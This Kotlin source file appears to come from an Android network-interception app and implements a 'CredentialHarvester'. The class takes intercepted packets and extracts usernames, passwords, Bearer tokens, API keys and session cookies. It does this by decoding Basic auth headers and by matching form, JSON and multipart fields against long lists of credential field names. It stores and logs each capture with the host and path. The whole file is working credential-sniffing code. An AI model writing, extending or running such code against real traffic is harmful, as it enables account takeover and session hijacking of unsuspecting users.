package com.cyberghost.core

import android.util.Log
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import java.net.URLDecoder
import java.nio.charset.StandardCharsets
import java.time.Instant
import org.json.JSONObject
import org.json.JSONException

data class HarvestedCredential(
    val timestamp: Instant = Instant.now(),
    val sourceIp: String,
    val host: String,
    val path: String,
    val protocol: String,
    val type: CredentialType,
    val username: String?,
    val password: String?,
    val token: String?,
    val rawFields: Map<String, String>,
    var notes: String = ""
)

enum class CredentialType {
    FORM_LOGIN,
    BASIC_AUTH,
    BEARER_TOKEN,
    JSON_LOGIN,
    API_KEY,
    COOKIE_SESSION
}

class CredentialHarvester {
    var enabled: Boolean = true

    private val _credentials = MutableSharedFlow<HarvestedCredential>(replay = 0, extraBufferCapacity = 256)
    val credentials: SharedFlow<HarvestedCredential> = _credentials

    private val credentialStore = mutableListOf<HarvestedCredential>()

    // known field names for username/password across different apps
    private val usernameFields = setOf(
        "username", "user", "email", "login", "userid", "user_id",
        "user_name", "account", "identifier", "phone", "mobile",
        "j_username", "uname", "u", "mail", "handle", "name",
        "log", "usr", "inputusername", "user_email", "loginid",
        "signin_email", "login_email", "credential", "identity"
    )

    private val passwordFields = setOf(
        "password", "pass", "passwd", "pwd", "secret", "pin",
        "passphrase", "j_password", "p", "pw", "user_pass",
        "user_password", "login_pass", "login_password", "inputpassword",
        "new_password", "current_password", "confirm_password", "passcode"
    )

    private val tokenFields = setOf(
        "token", "access_token", "auth_token", "api_key", "apikey",
        "api_secret", "client_secret", "oauth_token", "id_token",
        "refresh_token", "session_token", "bearer", "authorization"
    )

    fun inspect(packet: InterceptedPacket) {
        if (!enabled || !packet.isRequest || packet.body.isEmpty()) return

        try {
            val contentType = packet.headers["Content-Type"] ?: packet.headers["content-type"] ?: ""

            // check Authorization header first
            checkAuthorizationHeader(packet)

            // check cookie header for session tokens
            checkCookieHeader(packet)

            when {
                contentType.contains("application/x-www-form-urlencoded", ignoreCase = true) -> {
                    parseFormEncoded(packet)
                }
                contentType.contains("application/json", ignoreCase = true) -> {
                    parseJson(packet)
                }
                contentType.contains("multipart/form-data", ignoreCase = true) -> {
                    parseMultipart(packet)
                }
                packet.path.contains("login", ignoreCase = true) ||
                packet.path.contains("signin", ignoreCase = true) ||
                packet.path.contains("auth", ignoreCase = true) ||
                packet.path.contains("password", ignoreCase = true) -> {
                    // try form parse on any login-looking endpoint regardless of content type
                    parseFormEncoded(packet)
                }
            }
        } catch (e: Exception) {
            Log.e("CG2", "Harvester error", e)
        }
    }

    private fun checkAuthorizationHeader(packet: InterceptedPacket) {
        val auth = packet.headers["Authorization"] ?: packet.headers["authorization"] ?: return

        when {
            auth.startsWith("Basic ", ignoreCase = true) -> {
                try {
                    val encoded = auth.removePrefix("Basic ").trim()
                    val decoded = String(android.util.Base64.decode(encoded, android.util.Base64.DEFAULT))
                    val parts = decoded.split(":", limit = 2)
                    if (parts.size == 2) {
                        emit(HarvestedCredential(
                            sourceIp = packet.sourceIp, host = packet.host,
                            path = packet.path, protocol = packet.protocol,
                            type = CredentialType.BASIC_AUTH,
                            username = parts[0], password = parts[1],
                            token = null, rawFields = mapOf("Authorization" to auth),
                            notes = "HTTP Basic Auth"
                        ))
                    }
                } catch (e: Exception) { Log.e("CG2", "Basic auth parse failed", e) }
            }
            auth.startsWith("Bearer ", ignoreCase = true) -> {
                val token = auth.removePrefix("Bearer ").trim()
                emit(HarvestedCredential(
                    sourceIp = packet.sourceIp, host = packet.host,
                    path = packet.path, protocol = packet.protocol,
                    type = CredentialType.BEARER_TOKEN,
                    username = null, password = null,
                    token = token, rawFields = mapOf("Authorization" to auth),
                    notes = "Bearer Token"
                ))
            }
        }
    }

    private fun checkCookieHeader(packet: InterceptedPacket) {
        val cookie = packet.headers["Cookie"] ?: packet.headers["cookie"] ?: return
        val pairs = cookie.split(";").map { it.trim() }
        val sessionLike = pairs.filter { pair ->
            val key = pair.split("=").firstOrNull()?.lowercase() ?: ""
            key.contains("session") || key.contains("token") || key.contains("auth") ||
            key == "jwt" || key == "sid" || key == "ssid" || key == "phpsessid" ||
            key == "jsessionid" || key == "asp.net_sessionid" || key.contains("access")
        }
        if (sessionLike.isNotEmpty()) {
            val fields = mutableMapOf<String, String>()
            sessionLike.forEach { pair ->
                val parts = pair.split("=", limit = 2)
                if (parts.size == 2) fields[parts[0].trim()] = parts[1].trim()
            }
            emit(HarvestedCredential(
                sourceIp = packet.sourceIp, host = packet.host,
                path = packet.path, protocol = packet.protocol,
                type = CredentialType.COOKIE_SESSION,
                username = null, password = null,
                token = sessionLike.firstOrNull(), rawFields = fields,
                notes = "Session Cookie (${sessionLike.size} tokens)"
            ))
        }
    }

    private fun parseFormEncoded(packet: InterceptedPacket) {
        val body = String(packet.body, StandardCharsets.UTF_8)
        val fields = mutableMapOf<String, String>()

        body.split("&").forEach { pair ->
            val parts = pair.split("=", limit = 2)
            if (parts.size == 2) {
                try {
                    val key = URLDecoder.decode(parts[0], "UTF-8").lowercase()
                    val value = URLDecoder.decode(parts[1], "UTF-8")
                    fields[key] = value
                } catch (_: Exception) {}
            }
        }

        extractFromFields(fields, packet)
    }

    private fun parseJson(packet: InterceptedPacket) {
        val body = String(packet.body, StandardCharsets.UTF_8)
        val fields = mutableMapOf<String, String>()

        fun flattenJson(obj: JSONObject, prefix: String = "") {
            obj.keys().forEach { key ->
                val fullKey = if (prefix.isEmpty()) key else "$prefix.$key"
                try {
                    val value = obj.get(key)
                    when (value) {
                        is JSONObject -> flattenJson(value, fullKey)
                        is String -> fields[fullKey.lowercase()] = value
                        is Number, is Boolean -> fields[fullKey.lowercase()] = value.toString()
                        else -> {}
                    }
                } catch (_: Exception) {}
            }
        }

        try {
            flattenJson(JSONObject(body))
            extractFromFields(fields, packet)
        } catch (_: JSONException) {}
    }

    private fun parseMultipart(packet: InterceptedPacket) {
        val body = String(packet.body, StandardCharsets.UTF_8)
        val fields = mutableMapOf<String, String>()
        val contentDisposition = Regex("Content-Disposition: form-data; name=\"([^\"]+)\"\\s*\\n([^\\n-]+)", RegexOption.IGNORE_CASE)
        contentDisposition.findAll(body).forEach { match ->
            val key = match.groupValues[1].lowercase()
            val value = match.groupValues[2].trim()
            fields[key] = value
        }
        extractFromFields(fields, packet)
    }

    private fun extractFromFields(fields: Map<String, String>, packet: InterceptedPacket) {
        var username: String? = null
        var password: String? = null
        var token: String? = null
        val relevant = mutableMapOf<String, String>()

        fields.forEach { (key, value) ->
            val baseKey = key.split(".").last()
            when {
                usernameFields.any { baseKey.contains(it, ignoreCase = true) } -> {
                    if (value.isNotBlank() && value.length > 2) { username = value; relevant[key] = value }
                }
                passwordFields.any { baseKey.contains(it, ignoreCase = true) } -> {
                    if (value.isNotBlank() && value.length > 1) { password = value; relevant[key] = value }
                }
                tokenFields.any { baseKey.contains(it, ignoreCase = true) } -> {
                    if (value.isNotBlank()) { token = value; relevant[key] = value }
                }
            }
        }

        // emit if we found anything useful
        if (username != null || password != null || token != null) {
            val type = when {
                username != null && password != null -> CredentialType.FORM_LOGIN
                token != null -> CredentialType.API_KEY
                else -> CredentialType.FORM_LOGIN
            }

            val isLogin = packet.path.contains("login", ignoreCase = true) ||
                packet.path.contains("signin", ignoreCase = true) ||
                packet.path.contains("auth", ignoreCase = true) ||
                packet.path.contains("session", ignoreCase = true) ||
                packet.path.contains("token", ignoreCase = true) ||
                password != null

            if (isLogin || token != null) {
                emit(HarvestedCredential(
                    sourceIp = packet.sourceIp, host = packet.host,
                    path = packet.path, protocol = packet.protocol,
                    type = type, username = username, password = password,
                    token = token, rawFields = relevant,
                    notes = "Extracted from ${packet.method} ${packet.path}"
                ))
            }
        }
    }

    private fun emit(cred: HarvestedCredential) {
        Log.i("CG2", "CREDENTIAL: ${cred.host} | ${cred.type} | user=${cred.username} | pass=${cred.password?.take(4)}***")
        credentialStore.add(cred)
        _credentials.tryEmit(cred)
    }

    fun getAll(): List<HarvestedCredential> = credentialStore.toList()
    fun clear() { credentialStore.clear() }
    fun count(): Int = credentialStore.size
}
